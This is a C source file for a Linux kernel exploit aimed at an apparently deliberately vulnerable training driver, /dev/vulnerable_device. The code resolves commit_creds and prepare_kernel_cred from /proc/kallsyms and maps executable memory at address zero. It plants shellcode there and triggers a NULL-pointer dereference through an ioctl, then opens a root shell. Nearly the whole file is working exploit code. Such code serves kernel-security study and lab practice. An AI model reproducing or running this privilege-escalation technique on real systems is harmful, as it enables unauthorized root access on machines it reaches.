#define _GNU_SOURCE
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>

#include "../src/vuln_driver.h"
#include "../src/ckx_structs.h"

struct cred;
struct task_struct;

typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon) __attribute__((regparm(3)));
typedef int (*commit_creds_t)(struct cred *new) __attribute__((regparm(3)));

prepare_kernel_cred_t prepare_kernel_cred;
commit_creds_t commit_creds;




unsigned long get_kernel_sym(char *name)
{
    FILE *f;
    unsigned long addr;
    char dummy;
    char sname[256];
    int ret = 0;

    f = fopen("/proc/kallsyms", "r");
    if (f == NULL)
    {
        printf("[-] Failed to open /proc/kallsyms\n");
        exit(-1);
    }
    printf("[+] Find %s...\n", name);
    while (ret != EOF)
    {
        ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
        if (ret == 0)
        {
            fscanf(f, "%s\n", sname);
            continue;
        }
        if (!strcmp(name, sname))
        {
            fclose(f);
            printf("[+] Found %s at %lx\n", name, addr);
            return addr;
        }
    }
    fclose(f);
    return 0;
}


/*
typedef struct write_args_ckx
{
    char *buff;
    char *to;
    size_t count;
} write_args_ckx;
*/
/* run shell after root */
void get_shell()
{
    char *argv[] = {"/bin/sh", NULL};

    if (getuid() == 0)
    {
        printf("[+] Root shell success !! :)\n");
        execve("/bin/sh", argv, NULL);
    }
    printf("[-] failed to get root shell :(\n");
}

/* use for privilige escalation */
void get_root()
{
    commit_creds(prepare_kernel_cred(0));
}

int main(int ac, char **av)
{
    unsigned long addr;
    char buffer[10] = "12345";
    // addr = get_kernel_sym(av[1]);

    addr = get_kernel_sym("have_canfork_callback");
    printf("src is %p\n", buffer);
    write_args_ckx ws;
    ws.buff = buffer;
    ws.to = (char *)addr;
    printf("to is %lx\n",ws.to);
    ws.count = 2;

    /* get function address */

    //addr = get_kernel_sym("have_canfork_callback");


    prepare_kernel_cred = (prepare_kernel_cred_t)get_kernel_sym("prepare_kernel_cred");
    commit_creds = (commit_creds_t)get_kernel_sym("commit_creds");
    printf("Got commit_creds:%p\nGot commit_creds:%p\nprepare_kernel_cred%p\n", addr,commit_creds, prepare_kernel_cred);

    /* allocate memory loacate in 0x00 */
    printf("[+] Try to allocat 0x00000000...\n");
    if (mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE | MAP_FIXED, -1, 0) == (char *)-1)
    {
        printf("[-] Failed to allocat 0x00000000\n");
        return -1;
    }
    printf("[+] Allocation success !\n");



    //shellcode的填充替换方法！！！！！！！！！！！！！！
    unsigned char shellcode[] =
        {/*0x48, 0xC7, 0xC0, 0x5A, 0xF4, 0xF3, 0x81, */ /*0x48, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00,*/ 0x48, 0xB8, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0xFF, 0xD0, 0x48, 0x31, 0xC0, 0xC3};
    /* insert the getroot address to shellcode */
    void **get_root_offset = rawmemchr(shellcode, 0x42);
    (*get_root_offset) = get_root;
    /* map shellcode to 0x00 */
    memcpy(0, shellcode, sizeof(shellcode));






    getchar();
    int fd = open("/dev/vulnerable_device", O_RDWR);
    unsigned int ret;
//     ret = ioctl(fd, ARBITRARY_RW_WRITE_USER_CKX,&ws);
    ret = ioctl(fd,CKX_NULL,0);

    // pid_t pid = fork();
    // printf("fork_ret = %d\n", pid);

    get_shell();


}

